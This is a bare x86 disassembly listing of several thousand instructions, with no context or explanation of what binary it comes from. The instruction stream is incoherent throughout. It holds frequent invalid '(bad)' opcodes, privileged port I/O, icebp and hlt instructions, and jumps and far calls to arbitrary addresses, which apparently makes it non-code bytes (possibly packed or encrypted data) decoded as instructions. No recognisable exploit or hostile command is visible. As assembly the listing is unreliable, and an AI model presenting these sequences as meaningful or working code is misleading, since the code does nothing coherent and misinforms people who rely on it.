  4177b6:	cvttps2pi mm0,QWORD PTR [edx-0x3d4e49aa]
  4177bd:	pushf  
  4177be:	into   
  4177bf:	dec    ebx
  4177c0:	xchg   edx,eax
  4177c1:	dec    dl
  4177c3:	(bad)  
  4177c4:	cmp    eax,DWORD PTR [edi+0x13]
  4177c7:	jnp    0x4177f7
  4177c9:	pop    ebp
  4177ca:	out    dx,eax
  4177cb:	jg     0x4177f6
  4177cd:	jbe    0x41782d
  4177cf:	icebp  
  4177d0:	in     al,dx
  4177d1:	inc    ecx
  4177d2:	repz sub eax,0xd75acdd9
  4177d8:	mov    eax,ds:0x82be8508
  4177dd:	push   0x5ffa2e95
  4177e2:	out    0x6c,eax
  4177e4:	cmp    dh,0xcd
  4177e7:	mov    ds:0x1804e9ee,eax
  4177ec:	push   0xffffff8b
  4177ee:	sbb    dl,BYTE PTR [esi+ebp*2]
  4177f1:	jle    0x4177ad
  4177f3:	ds neg bl
  4177f6:	rcr    BYTE PTR [esi],1
  4177f8:	stos   BYTE PTR es:[edi],al
  4177f9:	icebp  
  4177fa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4177fb:	mov    eax,0x9bc014de
  417800:	in     eax,dx
  417801:	out    dx,eax
  417802:	and    al,0xe
  417804:	dec    ecx
  417805:	daa    
  417806:	scas   eax,DWORD PTR es:[edi]
  417807:	xchg   esi,eax
  417808:	test   BYTE PTR [ecx+ebp*1],dl
  41780b:	inc    ebp
  41780c:	or     esp,DWORD PTR [ecx+0x5d]
  41780f:	push   cs
  417810:	sbb    cl,BYTE PTR [esi+0x2a9723d0]
  417816:	test   al,0x2c
  417818:	and    dh,al
  41781a:	pop    esi
  41781b:	popf   
  41781c:	push   edi
  41781d:	not    DWORD PTR [esi+0x2d]
  417820:	sub    dh,0xaf
  417823:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417824:	pop    esp
  417825:	jne    0x41782a
  417827:	or     BYTE PTR ds:0xa67715f,bh
  41782d:	xor    DWORD PTR [esi-0x4f],ebp
  417830:	dec    edi
  417831:	mov    dl,0x61
  417833:	sub    ecx,esi
  417835:	icebp  
  417836:	jae    0x4178a4
  417838:	(bad)  
  417839:	scas   eax,DWORD PTR es:[edi]
  41783a:	or     BYTE PTR [ebx],al
  41783c:	xor    edx,eax
  41783e:	je     0x417861
  417840:	fsub   st,st(0)
  417842:	pushf  
  417843:	fist   WORD PTR [ecx]
  417845:	push   ebp
  417846:	mov    ds:0x68db6b72,al
  41784b:	out    0x2e,eax
  41784d:	sub    al,0xd0
  41784f:	dec    ecx
  417850:	jb     0x4177da
  417852:	push   ebx
  417853:	das    
  417854:	push   ss
  417855:	leave  
  417856:	dec    ebp
  417857:	lds    ecx,FWORD PTR [esi+0x27]
  41785a:	push   0xa5f84c15
  41785f:	pop    ebp
  417860:	out    0x99,al
  417862:	test   eax,0x3d2561b1
  417867:	adc    edx,ecx
  417869:	and    BYTE PTR [ecx],dl
  41786b:	fcom   DWORD PTR [ebx+0x7520e96f]
  417871:	mov    edx,0x3fa3b8b1
  417876:	push   0xffffff8e
  417878:	sbb    ebx,eax
  41787a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41787b:	add    ecx,DWORD PTR [esi+0x57104a04]
  417881:	clc    
  417882:	les    esi,FWORD PTR [esi]
  417884:	jne    0x417889
  417886:	push   ebx
  417887:	les    esp,FWORD PTR [esi+0x79]
  41788a:	mov    bh,0xed
  41788c:	adc    eax,0xfe32cef2
  417891:	cld    
  417892:	fsubr  st(6),st
  417894:	in     al,dx
  417895:	xor    al,0x46
  417897:	pop    edx
  417898:	in     eax,dx
  417899:	adc    DWORD PTR [ecx],edx
  41789b:	not    DWORD PTR [ebx]
  41789d:	out    dx,al
  41789e:	int    0x17
  4178a0:	push   esi
  4178a1:	xchg   edi,eax
  4178a2:	push   eax
  4178a3:	(bad)  
  4178a4:	cmp    al,0xc6
  4178a6:	sub    esp,DWORD PTR [ebp+0x4393178d]
  4178ac:	shl    DWORD PTR [ebx],1
  4178ae:	in     eax,0xaa
  4178b0:	lock mov ds:0xf389e00d,al
  4178b6:	jle    0x417902
  4178b8:	in     eax,dx
  4178b9:	or     eax,0xc4ffaac
  4178be:	mov    bh,0xb1
  4178c0:	scas   eax,DWORD PTR es:[edi]
  4178c1:	fldenv [edi]
  4178c3:	fsub   DWORD PTR [esi+0x1259db3d]
  4178c9:	retf   
  4178ca:	sti    
  4178cb:	mov    bh,0x55
  4178cd:	sbb    BYTE PTR ds:0x56327703,bl
  4178d3:	or     eax,0x2f0d0724
  4178d8:	(bad)  
  4178d9:	cmc    
  4178da:	lahf   
  4178db:	rep stos DWORD PTR es:[edi],eax
  4178dd:	xor    al,0xbe
  4178df:	or     bl,al
  4178e1:	sar    ecx,1
  4178e3:	aam    0xf5
  4178e5:	xchg   ecx,eax
  4178e6:	add    DWORD PTR [ebx+0x8fb7137],ebx
  4178ec:	and    BYTE PTR [ecx-0xc7054f2],cl
  4178f2:	add    ebx,esp
  4178f4:	dec    ebp
  4178f5:	(bad)  
  4178f6:	stos   DWORD PTR es:[edi],eax
  4178f7:	sbb    edx,ebp
  4178f9:	mov    dh,0xc0
  4178fb:	aad    0x11
  4178fd:	jbe    0x41793b
  4178ff:	sbb    bl,BYTE PTR [edi]
  417901:	fidivr WORD PTR [ebx]
  417903:	repz clc 
  417905:	xor    al,BYTE PTR [ebp+0xb]
  417908:	xchg   ebp,eax
  417909:	in     al,dx
  41790a:	scas   al,BYTE PTR es:[edi]
  41790b:	push   cs
  41790c:	xor    eax,DWORD PTR [ebx+0x2660bed2]
  417912:	sub    cl,dh
  417914:	test   al,0xdd
  417916:	(bad)
  417919:	push   0xffffffa6
  41791b:	sub    ebp,esi
  41791d:	iret   
  41791e:	lahf   
  41791f:	in     al,0xe0
  417921:	dec    ebx
  417922:	cmp    BYTE PTR [ebx-0x2],ch
  417925:	adc    ecx,DWORD PTR [esi*4+0x172c3c14]
  41792c:	not    DWORD PTR [ebp-0x3c]
  41792f:	xchg   BYTE PTR [eax-0x209650b3],dl
  417935:	ret    
  417936:	arpl   ax,ax
  417938:	ins    DWORD PTR es:[edi],dx
  417939:	test   al,0xe2
  41793b:	lahf   
  41793c:	stos   BYTE PTR es:[edi],al
  41793d:	loope  0x41799c
  41793f:	icebp  
  417940:	out    dx,al
  417941:	es push eax
  417943:	mov    ah,0xa3
  417945:	outs   dx,DWORD PTR ds:[esi]
  417946:	push   cs
  417947:	push   ebx
  417948:	push   ebp
  417949:	inc    esp
  41794a:	ins    BYTE PTR es:[edi],dx
  41794b:	shl    BYTE PTR [edi+0x38],cl
  41794e:	call   0x9ce3eb56
  417953:	test   DWORD PTR [eax+0x58],0xc1d01b83
  41795a:	fcmovbe st,st(1)
  41795c:	mov    al,ds:0xa08243d3
  417961:	mov    ebx,0x1339be22
  417966:	(bad)  
  417968:	pop    ds
  417969:	add    bl,BYTE PTR ds:0x439f2b7d
  41796f:	and    BYTE PTR [ebx+esi*4+0x19],dh
  417973:	push   ds
  417974:	retf   0x9f84
  417977:	jno    0x4179a3
  417979:	jge    0x41795d
  41797b:	out    0x62,al
  41797d:	mov    ebx,0xdca8c8a4
  417982:	add    eax,0xeb7a7255
  417987:	adc    BYTE PTR [edi+0x5d],ch
  41798a:	aad    0x9e
  41798c:	into   
  41798d:	cmp    al,0x84
  41798f:	mov    DWORD PTR [ebp-0x11],eax
  417992:	imul   edi,DWORD PTR [ebx],0xf1279ffe
  417998:	or     BYTE PTR [edx],ah
  41799a:	fldcw  WORD PTR [esi]
  41799c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41799d:	int3   
  41799e:	ins    DWORD PTR es:[edi],dx
  41799f:	and    DWORD PTR [ecx-0x6aa26469],0x3b
  4179a6:	out    dx,al
  4179a7:	mov    eax,0x33d48573
  4179ac:	adc    DWORD PTR [ebx+ebp*8+0x1e],0xffffff81
  4179b1:	loop   0x417952
  4179b3:	aaa    
  4179b4:	mov    edx,0x12ab1c5e
  4179b9:	dec    esp
  4179ba:	sbb    DWORD PTR [ecx],ebp
  4179bc:	enter  0x276d,0xc3
  4179c0:	push   ecx
  4179c1:	add    eax,0x800c0dca
  4179c6:	xchg   ecx,eax
  4179c7:	bound  edi,QWORD PTR [eax+ebx*8+0x48]
  4179cb:	cmp    bl,cl
  4179cd:	push   esi
  4179ce:	cmp    DWORD PTR [esi+0x4b853172],esp
  4179d4:	adc    BYTE PTR [ecx],dh
  4179d6:	jmp    0x4179c5
  4179d8:	jg     0x417a02
  4179da:	ror    BYTE PTR [ebx],cl
  4179dc:	ret    
  4179dd:	test   eax,0x15790f3
  4179e2:	sub    DWORD PTR [ecx-0x36],eax
  4179e5:	adc    DWORD PTR [edx-0x650f5063],ecx
  4179eb:	jo     0x417974
  4179ed:	aaa    
  4179ee:	xchg   DWORD PTR [ebx-0x1b],ebp
  4179f1:	and    ecx,DWORD PTR [esi]
  4179f3:	icebp  
  4179f4:	fstp   DWORD PTR [ebx+0x73]
  4179f7:	out    dx,eax
  4179f8:	les    ebx,FWORD PTR [ecx]
  4179fa:	adc    DWORD PTR [esi+ebp*8+0x487d2ddc],0x685df1a1
  417a05:	icebp  
  417a06:	push   esp
  417a07:	or     BYTE PTR [esi-0x69],ch
  417a0a:	fwait
  417a0b:	ja     0x417a5f
  417a0d:	add    ch,BYTE PTR [ebp-0x248e9234]
  417a13:	fisub  WORD PTR [eax+0x4decd145]
  417a19:	mov    eax,0x5e712320
  417a1e:	xor    edi,eax
  417a20:	mov    ebp,0x71f594
  417a25:	jns    0x4179d4
  417a27:	dec    edx
  417a28:	and    al,al
  417a2a:	pop    ebp
  417a2b:	push   es
  417a2c:	jle    0x417a48
  417a2e:	mov    bh,0x9b
  417a30:	(bad)  
  417a32:	xchg   esi,eax
  417a33:	or     BYTE PTR [eax-0x538c4bf1],al
  417a39:	(bad)  
  417a3a:	cmp    BYTE PTR [ebx],al
  417a3c:	fsub   DWORD PTR [edi-0x1f]
  417a3f:	cld    
  417a40:	cld    
  417a41:	pop    edi
  417a42:	inc    edi
  417a43:	lahf   
  417a44:	ins    BYTE PTR es:[edi],dx
  417a45:	mov    dh,0x2a
  417a47:	pop    edx
  417a48:	xor    eax,0x3a4554e7
  417a4d:	xor    eax,0xa51e2e3c
  417a52:	pop    ebx
  417a53:	or     DWORD PTR [ebp-0x7c],ecx
  417a56:	xchg   ebx,eax
  417a57:	out    dx,eax
  417a58:	aam    0x9c
  417a5a:	leave  
  417a5b:	sub    BYTE PTR [edx],al
  417a5d:	shl    DWORD PTR [ebp-0x1435afdd],1
  417a63:	push   0x7
  417a65:	into   
  417a66:	dec    DWORD PTR [ebp+edi*8+0x371c5210]
  417a6d:	hlt    
  417a6e:	jl     0x417a42
  417a70:	(bad)  
  417a71:	sbb    DWORD PTR [esi],edi
  417a73:	iret   
  417a74:	rcr    ecx,cl
  417a76:	xor    dh,al
  417a78:	adc    dh,BYTE PTR [ecx-0x53dae6a]
  417a7e:	inc    edx
  417a7f:	shl    DWORD PTR [edx],0xa9
  417a82:	xchg   ebp,eax
  417a83:	push   eax
  417a84:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417a85:	adc    ah,ah
  417a87:	bound  ebp,QWORD PTR [edx-0x6a]
  417a8a:	push   ebx
  417a8b:	push   esp
  417a8c:	mov    ebp,0x2deaccc0
  417a91:	sub    BYTE PTR [eax-0x12],al
  417a94:	dec    ecx
  417a95:	pushf  
  417a96:	(bad)  
  417a97:	loope  0x417aa5
  417a99:	hlt    
  417a9a:	in     al,0x62
  417a9c:	into   
  417a9d:	sub    BYTE PTR [ecx+ebx*4+0x29],0x34
  417aa2:	sahf   
  417aa3:	dec    edi
  417aa4:	xchg   DWORD PTR [ebp-0x73c3f267],eax
  417aaa:	popa   
  417aab:	fs xchg edi,eax
  417aad:	push   cs
  417aae:	dec    sp
  417ab0:	xor    al,0x47
  417ab2:	mov    esi,0x3e9296d1
  417ab7:	div    ch
  417ab9:	xor    DWORD PTR [eax-0x31],eax
  417abc:	out    dx,eax
  417abd:	jle    0x417a6c
  417abf:	aam    0xdc
  417ac1:	inc    edx
  417ac2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417ac3:	fdiv   DWORD PTR [esi+0x33f3c262]
  417ac9:	int3   
  417aca:	lods   al,BYTE PTR ds:[esi]
  417acb:	xchg   edx,eax
  417acc:	hlt    
  417acd:	loope  0x417aec
  417acf:	nop
  417ad0:	dec    ecx
  417ad1:	fiadd  DWORD PTR ds:0xeb8d33bd
  417ad7:	mov    al,ds:0xf3b43748
  417adc:	std    
  417add:	(bad)  
  417ade:	and    al,0x18
  417ae0:	cmp    DWORD PTR [esi-0x6c],esi
  417ae3:	fsubr  st,st(6)
  417ae5:	dec    ebp
  417ae6:	(bad)
  417aea:	jb     0x417a90
  417aec:	in     eax,dx
  417aed:	loop   0x417af9
  417aef:	push   es
  417af0:	push   es
  417af1:	fidiv  DWORD PTR [edi-0x67]
  417af4:	push   edi
  417af5:	jbe    0x417a9d
  417af7:	repnz push 0x70016d01
  417afd:	in     eax,dx
  417afe:	ja     0x417b6d
  417b00:	test   DWORD PTR [esi+0x43],ebp
  417b03:	cld    
  417b04:	inc    edi
  417b05:	scas   al,BYTE PTR es:[edi]
  417b06:	ins    BYTE PTR es:[edi],dx
  417b07:	scas   eax,DWORD PTR es:[edi]
  417b08:	in     al,dx
  417b09:	xor    DWORD PTR [ecx-0x576d4491],esi
  417b0f:	popf   
  417b10:	fbstp  TBYTE PTR [eax]
  417b12:	inc    ebp
  417b13:	(bad)  
  417b14:	shl    BYTE PTR [ebx+ecx*8-0x72],cl
  417b18:	ret    0xe13d
  417b1b:	loop   0x417b1c
  417b1d:	jne    0x417b35
  417b1f:	lods   eax,DWORD PTR ds:[esi]
  417b20:	xchg   esp,eax
  417b21:	adc    edx,ebp
  417b23:	iret   
  417b24:	adc    DWORD PTR [eax],0x46
  417b27:	dec    edi
  417b28:	mov    esi,0x6ca39a86
  417b2d:	and    DWORD PTR [esi],ecx
  417b2f:	sbb    DWORD PTR [eax+0xd],edx
  417b32:	nop
  417b33:	leave  
  417b34:	inc    eax
  417b35:	clc    
  417b36:	es sbb dh,al
  417b39:	mov    ch,0x34
  417b3b:	dec    ecx
  417b3c:	push   ds
  417b3d:	sub    DWORD PTR es:[ebx-0x6a485296],edx
  417b44:	mov    esi,0x83205a5c
  417b49:	sti    
  417b4a:	xor    DWORD PTR [ebx],ebp
  417b4c:	sub    cl,BYTE PTR ds:0x9444b18b
  417b52:	dec    eax
  417b53:	int    0xff
  417b55:	inc    ebp
  417b56:	and    BYTE PTR [esi+0x2],bl
  417b59:	fwait
  417b5a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417b5b:	mov    eax,0x8fdb2a10
  417b60:	mov    edx,0x5d5e37e3
  417b65:	pusha  
  417b66:	mov    ch,0xa1
  417b68:	mov    dh,0xb0
  417b6a:	adc    bl,BYTE PTR [eax]
  417b6c:	es ret 0x1e5c
  417b70:	retf   0x1fbd
  417b73:	jb     0x417beb
  417b75:	adc    dl,BYTE PTR [eax+0x57]
  417b78:	push   ebp
  417b79:	jb     0x417b75
  417b7b:	ror    DWORD PTR [ebx],cl
  417b7d:	into   
  417b7e:	mov    eax,ds:0xd26987d1
  417b83:	jmp    0x417bf3
  417b85:	jno    0x417bdf
  417b87:	lods   al,BYTE PTR ds:[esi]
  417b88:	jo     0x417bfa
  417b8a:	inc    esp
  417b8b:	xchg   edi,eax
  417b8c:	fcmovnu st,st(7)
  417b8e:	inc    ecx
  417b8f:	cmp    ch,BYTE PTR [eax]
  417b91:	lea    esp,[ebx-0x64]
  417b94:	pop    eax
  417b95:	outs   dx,BYTE PTR ds:[esi]
  417b96:	lock pop es
  417b98:	mov    dl,0x62
  417b9a:	push   edi
  417b9b:	enter  0xa348,0x82
  417b9f:	arpl   WORD PTR [edx],cx
  417ba1:	dec    ebx
  417ba2:	sub    bl,0xd2
  417ba5:	pop    eax
  417ba6:	pop    esp
  417ba7:	je     0x417bb0
  417ba9:	cmp    al,0x16
  417bab:	and    ch,0xf1
  417bae:	ss loope 0x417b4d
  417bb1:	popf   
  417bb2:	jae    0x417bfe
  417bb4:	jecxz  0x417c11
  417bb6:	xor    esi,esp
  417bb8:	cmp    bh,BYTE PTR [esi-0x5d]
  417bbb:	add    BYTE PTR [edx-0x4],dl
  417bbe:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417bbf:	sbb    eax,0xfbab4535
  417bc4:	es xchg ch,cl
  417bc7:	aad    0x78
  417bc9:	sbb    eax,0x9f7526af
  417bce:	mov    eax,0x418aece
  417bd3:	add    bl,al
  417bd5:	add    ecx,DWORD PTR [eax]
  417bd7:	hlt    
  417bd8:	retf   
  417bd9:	out    0x3c,eax
  417bdb:	in     al,dx
  417bdc:	or     DWORD PTR [eax],eax
  417bde:	call   0xe65d12ed
  417be3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417be4:	mov    cl,BYTE PTR [edi]
  417be6:	jecxz  0x417bf3
  417be8:	pop    eax
  417be9:	enter  0xf31e,0xa6
  417bed:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417bee:	fwait
  417bef:	arpl   WORD PTR [ebx-0x66],ax
  417bf2:	mov    ds:0x70fd3ad2,eax
  417bf7:	mov    dh,0x39
  417bf9:	sub    dl,BYTE PTR [eax+0x3c8155b]
  417bff:	xor    ebp,ebp
  417c01:	(bad)  
  417c02:	lds    ebx,FWORD PTR ds:[ecx]
  417c05:	cwde   
  417c06:	xor    DWORD PTR [eax],0xb16be922
  417c0c:	idiv   BYTE PTR [esi-0x3f]
  417c0f:	outs   dx,DWORD PTR ds:[esi]
  417c10:	cmp    ebp,DWORD PTR [eax+edi*2+0x653d2cb8]
  417c17:	mov    ds:0x8a7a3900,eax
  417c1c:	pop    esp
  417c1d:	mov    bh,0x43
  417c1f:	jo     0x417c62
  417c21:	jne    0x417bcd
  417c23:	fbld   TBYTE PTR [esi]
  417c25:	fstp   DWORD PTR [eax-0x5a5adb52]
  417c2b:	push   es
  417c2c:	ret    
  417c2d:	mov    ebx,DWORD PTR [edx-0x617621c0]
  417c33:	popf   
  417c34:	xchg   esp,edi
  417c36:	xchg   ebp,eax
  417c37:	push   eax
  417c38:	je     0x417c15
  417c3a:	pop    edx
  417c3b:	cmp    al,0x1b
  417c3d:	adc    esp,ecx
  417c3f:	inc    edx
  417c40:	out    0x5d,eax
  417c42:	dec    esi
  417c43:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417c44:	and    eax,0x224af4d8
  417c49:	call   FWORD PTR [eax-0x779e8ac1]
  417c4f:	daa    
  417c50:	dec    esp
  417c51:	call   0x5f29f1fd
  417c56:	mov    esi,0x85daaddb
  417c5b:	cmp    edi,edx
  417c5d:	jg     0x417ca1
  417c5f:	rcr    ebp,0xfc
  417c62:	(bad)  
  417c63:	je     0x417c0b
  417c65:	xor    ah,ch
  417c67:	push   edx
  417c68:	icebp  
  417c69:	rcr    BYTE PTR [ebx+0x3c9632ed],cl
  417c6f:	inc    edi
  417c70:	in     eax,0x3e
  417c72:	shl    DWORD PTR [edi+0x29],cl
  417c75:	pop    esi
  417c76:	dec    esp
  417c77:	jl     0x417cf3
  417c79:	cmp    BYTE PTR [esp+ebp*8],dh
  417c7c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417c7d:	xor    BYTE PTR [esi+0x6d],bh
  417c80:	faddp  st(0),st
  417c82:	into   
  417c83:	jg     0x417cb7
  417c85:	push   esi
  417c86:	adc    BYTE PTR [esi+0x40],0xc5
  417c8a:	add    al,0x31
  417c8c:	pop    eax
  417c8d:	std    
  417c8e:	cld    
  417c8f:	xchg   ebx,eax
  417c90:	test   BYTE PTR [esi+edx*8+0x18f6ffc3],cl
  417c97:	push   esi
  417c98:	jge    0x417cce
  417c9a:	pop    ecx
  417c9b:	inc    eax
  417c9c:	sub    ch,BYTE PTR [esi+ebp*8+0x5f7c3742]
  417ca3:	cmp    esi,DWORD PTR [esi+0x2a5f31f6]
  417ca9:	adc    esi,DWORD PTR [edi]
  417cab:	fnstcw WORD PTR [edx]
  417cad:	retf   
  417cae:	fwait
  417caf:	xchg   edx,eax
  417cb0:	dec    esp
  417cb1:	dec    esi
  417cb2:	fimul  DWORD PTR [ecx]
  417cb4:	adc    bh,bl
  417cb6:	je     0x417c77
  417cb8:	cdq    
  417cb9:	xchg   esi,eax
  417cba:	mov    esi,0xff5de23f
  417cbf:	mov    edx,0xc1d1de50
  417cc4:	sbb    eax,0x79f6652f
  417cc9:	test   al,0x6
  417ccb:	lds    edi,FWORD PTR [esi-0xef75c78]
  417cd1:	jl     0x417c7d
  417cd3:	aas    
  417cd4:	inc    ecx
  417cd5:	inc    eax
  417cd6:	enter  0xab6,0x6c
  417cda:	out    0x57,eax
  417cdc:	arpl   WORD PTR ds:0xf95e223d,di
  417ce2:	xchg   esp,eax
  417ce3:	mov    bl,0xe8
  417ce5:	mov    al,ds:0xf5e3b984
  417cea:	mov    ebx,0x8a82a30b
  417cef:	jb     0x417cab
  417cf1:	loopne 0x417d29
  417cf3:	fdiv   QWORD PTR [ecx]
  417cf5:	inc    esp
  417cf6:	sbb    al,0xc1
  417cf8:	jnp    0x417c7b
  417cfa:	popf   
  417cfb:	js     0x417d0b
  417cfd:	popa   
  417cfe:	retf   0x7f45
  417d01:	js     0x417d3d
  417d03:	push   edx
  417d04:	fs xchg edi,eax
  417d06:	adc    bl,BYTE PTR [ecx]
  417d08:	mov    WORD PTR ds:0x61df5030,gs
  417d0e:	dec    edx
  417d0f:	mov    edi,0x9163a48f
  417d14:	rcr    BYTE PTR [ecx-0x36ce8c],1
  417d1a:	ror    esp,cl
  417d1c:	leave  
  417d1d:	mov    dl,0x11
  417d1f:	mov    ch,0x41
  417d21:	shr    bl,0xb
  417d24:	arpl   WORD PTR ds:[ebx+0x7f],bp
  417d28:	nop
  417d29:	in     eax,0xeb
  417d2b:	pop    es
  417d2c:	out    dx,al
  417d2d:	push   esi
  417d2e:	mov    BYTE PTR [esi+0x0],0x37
  417d32:	dec    esi
  417d33:	scas   eax,DWORD PTR es:[edi]
  417d34:	sub    DWORD PTR [ecx-0x4970fe21],ecx
  417d3a:	pop    edi
  417d3b:	aaa    
  417d3c:	add    DWORD PTR [eax],edx
  417d3e:	cld    
  417d3f:	xchg   esi,eax
  417d40:	shl    BYTE PTR [ebp-0x99e3b6a],1
  417d46:	inc    eax
  417d47:	mov    al,0xec
  417d49:	clc    
  417d4a:	fcmovbe st,st(3)
  417d4c:	jb     0x417ce2
  417d4e:	cmp    BYTE PTR [eax],ah
  417d50:	xchg   ebx,edx
  417d52:	jge    0x417d63
  417d54:	sub    eax,0xdd36daba
  417d59:	mov    DWORD PTR [edi-0x75],edi
  417d5c:	repnz pop ebx
  417d5e:	fiadd  WORD PTR [edx]
  417d60:	mov    ds:0x164a54f8,eax
  417d65:	retf   
  417d66:	mov    ch,0x8a
  417d68:	call   0x6489b45a
  417d6d:	mov    eax,0x46ba8ec8
  417d72:	jne    0x417d21
  417d74:	lahf   
  417d75:	sbb    esp,DWORD PTR [ebp-0x66]
  417d78:	mov    ch,0x7a
  417d7a:	add    DWORD PTR [edx+0x6280a300],0xdc24c1d3
  417d84:	push   DWORD PTR [eax+edi*4+0x29]
  417d88:	mov    ds:0x8f57f5eb,eax
  417d8d:	adc    al,0xc
  417d8f:	sbb    ah,al
  417d91:	or     bl,BYTE PTR [eax-0x790e8e5b]
  417d97:	aam    0xd3
  417d99:	or     dh,BYTE PTR [esi+0x65f51d71]
  417d9f:	sub    eax,0xb10e096e
  417da4:	in     eax,dx
  417da5:	fs das 
  417da7:	add    eax,0x2485e16e
  417dac:	xchg   esp,eax
  417dad:	jle    0x417dc8
  417daf:	dec    edi
  417db0:	sbb    BYTE PTR [edi+edx*4-0x4b],0x9c
  417db5:	cli    
  417db6:	inc    ebp
  417db7:	rcl    DWORD PTR [ebp+0xc9a44fd],cl
  417dbd:	pop    es
  417dbe:	call   0xbd9d:0xcdbd2de7
  417dc5:	jecxz  0x417e39
  417dc7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417dc8:	adc    BYTE PTR [edi],bh
  417dca:	or     esi,DWORD PTR [edi+0x2bf17ab2]
  417dd0:	mov    fs,WORD PTR [ecx-0x4f]
  417dd3:	push   es
  417dd4:	inc    esp
  417dd5:	xchg   ebp,eax
  417dd6:	dec    edi
  417dd7:	pop    ebp
  417dd8:	jno    0x417dd4
  417dda:	or     esi,DWORD PTR [ebp-0x11a2e8e3]
  417de0:	xlat   BYTE PTR ds:[ebx]
  417de1:	xchg   ecx,eax
  417de2:	cmc    
  417de3:	pusha  
  417de4:	jmp    0x417e29
  417de6:	add    DWORD PTR [esi+0x7ce8191a],esp
  417dec:	or     ecx,DWORD PTR [edx+0x3f]
  417def:	ret    
  417df0:	enter  0x2c,0x4
  417df4:	or     dh,BYTE PTR [eax+edi*1+0x75]
  417df8:	or     BYTE PTR [edi],cl
  417dfa:	jmp    0x417d8c
  417dfc:	lea    ebx,[esi-0x968a49d]
  417e02:	je     0x417ded
  417e04:	mov    cl,0xe0
  417e06:	out    dx,eax
  417e07:	lods   eax,DWORD PTR ds:[esi]
  417e08:	mov    eax,ds:0x89aab8f8
  417e0d:	fcomp  st(1)
  417e0f:	daa    
  417e10:	and    bh,dl
  417e12:	push   cs
  417e13:	mov    bl,BYTE PTR [edi-0x11]
  417e16:	hlt    
  417e17:	pop    ebx
  417e18:	mul    BYTE PTR [edi-0x6e]
  417e1b:	jl     0x417e6b
  417e1d:	ret    
  417e1e:	(bad)  [ebx]
  417e20:	xchg   edx,eax
  417e22:	push   esp
  417e23:	cmc    
  417e24:	inc    eax
  417e25:	jge    0x417e6a
  417e27:	hlt    
  417e28:	push   esi
  417e29:	sub    cl,ch
  417e2b:	mov    dh,0xaa
  417e2d:	adc    eax,0x577db57d
  417e32:	mov    ds:0xff108d86,al
  417e37:	adc    al,0x52
  417e39:	or     al,ch
  417e3b:	mov    dl,BYTE PTR [esi+0x7763a93f]
  417e41:	ja     0x417e58
  417e43:	and    cl,BYTE PTR [ecx+0x39]
  417e46:	and    DWORD PTR [edi+eiz*1],edi
  417e49:	lods   al,BYTE PTR ds:[esi]
  417e4a:	jecxz  0x417e46
  417e4c:	(bad)  
  417e4d:	sub    al,0xcc
  417e4f:	dec    edx
  417e50:	sahf   
  417e51:	ds jae 0x417e1b
  417e54:	pop    edi
  417e55:	pushf  
  417e56:	xlat   BYTE PTR ds:[ebx]
  417e57:	xchg   esi,eax
  417e58:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417e59:	xor    bh,BYTE PTR fs:[esi+ebx*4]
  417e5d:	sub    BYTE PTR [esi],cl
  417e5f:	push   ebp
  417e60:	jb     0x417e6d
  417e62:	xchg   edi,eax
  417e63:	mov    al,ds:0xb73bc93c
  417e68:	in     al,0x40
  417e6a:	jp     0x417e82
  417e6c:	add    esp,ebp
  417e6e:	(bad)
  417e72:	push   esp
  417e73:	cmp    DWORD PTR [ebx+0x2304a497],ebx
  417e79:	mov    ecx,0x34d48ec8
  417e7e:	or     al,0xbc
  417e80:	sbb    ah,BYTE PTR [ecx]
  417e82:	fisttp DWORD PTR [ebx]
  417e84:	push   0x24012ffb
  417e89:	push   es
  417e8a:	inc    edi
  417e8b:	int    0x6a
  417e8d:	mov    edx,DWORD PTR [esi+0x46]
  417e90:	inc    ecx
  417e91:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417e92:	(bad)  
  417e93:	jge    0x417e84
  417e95:	mov    bl,0xf2
  417e97:	hlt    
  417e98:	xor    DWORD PTR [edx+0x26],eax
  417e9b:	cmp    esi,DWORD PTR [ecx+0x1c]
  417e9e:	out    0xa1,al
  417ea0:	xchg   DWORD PTR ds:0xb2bf1586,ebx
  417ea6:	add    al,0x7a
  417ea8:	pop    ss
  417ea9:	xchg   esp,eax
  417eaa:	dec    ecx
  417eab:	inc    esi
  417eac:	test   bl,0x19
  417eaf:	push   edi
  417eb0:	mov    edx,0x3f5465e6
  417eb5:	push   edx
  417eb6:	sbb    eax,0x99133c50
  417ebb:	fwait
  417ebc:	cmc    
  417ebd:	(bad)  
  417ebe:	sbb    al,0xbe
  417ec0:	(bad)  
  417ec1:	cmp    al,0x9
  417ec3:	les    ebx,FWORD PTR [ebp+0x67]
  417ec6:	test   BYTE PTR [edx],0xfe
  417ec9:	jmp    FWORD PTR [ecx-0x1f016603]
  417ecf:	mov    edi,0xe26144d8
  417ed4:	add    BYTE PTR [eax+0x5b],cl
  417ed7:	sbb    eax,0xa3e40028
  417edc:	mov    esi,0x6856862b
  417ee1:	dec    ecx
  417ee2:	add    bh,bh
  417ee4:	adc    dl,BYTE PTR [ecx+0x5d]
  417ee7:	push   esi
  417ee8:	sbb    bh,al
  417eea:	nop
  417eeb:	mov    BYTE PTR [edx],ah
  417eed:	adc    eax,0x79867f7b
  417ef2:	fwait
  417ef3:	adc    DWORD PTR [ecx],esp
  417ef5:	and    DWORD PTR [esi+0x31],ebx
  417ef8:	ins    DWORD PTR es:[edi],dx
  417ef9:	clc    
  417efa:	pusha  
  417efb:	jl     0x417eec
  417efd:	cmp    dh,BYTE PTR [esp+esi*8-0x29]
  417f01:	cld    
  417f02:	out    dx,al
  417f03:	xchg   DWORD PTR [edx],ebp
  417f05:	cmp    al,0xfb
  417f07:	adc    DWORD PTR [bx+si-0x75a3],ecx
  417f0c:	popf   
  417f0d:	cmp    ebp,eax
  417f0f:	inc    esi
